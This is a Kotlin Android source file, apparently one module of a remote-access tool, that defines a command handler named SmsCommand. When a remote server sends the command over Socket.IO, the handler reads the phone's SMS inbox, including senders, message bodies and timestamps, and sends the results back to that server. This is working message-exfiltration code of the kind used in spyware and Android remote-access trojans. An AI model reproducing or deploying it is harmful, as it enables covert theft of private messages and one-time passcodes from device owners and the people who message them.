package com.remote.system

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.util.Log
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject
import io.socket.client.Socket

class SmsCommand(private val context: Context) : CommandHandler {
    private val tag = "SmsCommand"

    override fun execute(params: JSONObject, clientId: String, socket: Socket) {
        // Check SMS permission
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) 
            != PackageManager.PERMISSION_GRANTED) {
            
            sendErrorResponse("SMS permission not granted", clientId, socket)
            return
        }

        try {
            val limit = params.optInt("limit", 10) // Default 10 messages
            val response = JSONObject()
            val data = JSONObject()
            val smsArray = JSONArray()

            // Query SMS database
            val uri = Uri.parse("content://sms/inbox")
            val projection = arrayOf("_id", "address", "body", "date", "read")
            val sortOrder = "date DESC LIMIT $limit"

            val cursor = context.contentResolver.query(
                uri, projection, null, null, sortOrder
            )

            cursor?.use {
                val idIndex = it.getColumnIndex("_id")
                val addressIndex = it.getColumnIndex("address")
                val bodyIndex = it.getColumnIndex("body")
                val dateIndex = it.getColumnIndex("date")
                val readIndex = it.getColumnIndex("read")

                while (it.moveToNext()) {
                    val smsObject = JSONObject()
                    smsObject.put("id", it.getLong(idIndex))
                    smsObject.put("sender", it.getString(addressIndex) ?: "Unknown")
                    smsObject.put("message", it.getString(bodyIndex) ?: "")
                    smsObject.put("timestamp", it.getLong(dateIndex))
                    smsObject.put("read", it.getInt(readIndex) == 1)

                    smsArray.put(smsObject)
                }
            }

            data.put("messages", smsArray)
            data.put("count", smsArray.length())

            response.put("success", true)
            response.put("data", data)
            response.put("command", "get_sms")
            response.put("clientId", clientId)

            socket.emit("command-response", response)
            Log.d(tag, "SMS data sent successfully: ${smsArray.length()} messages")

        } catch (e: Exception) {
            Log.e(tag, "Error reading SMS", e)
            sendErrorResponse("Failed to read SMS: ${e.message}", clientId, socket)
        }
    }

    private fun sendErrorResponse(error: String, clientId: String, socket: Socket) {
        try {
            val errorResponse = JSONObject()
            errorResponse.put("success", false)
            errorResponse.put("error", error)
            errorResponse.put("command", "get_sms")
            errorResponse.put("clientId", clientId)
            socket.emit("command-response", errorResponse)
        } catch (e: JSONException) {
            Log.e(tag, "Error sending error response", e)
        }
    }
}
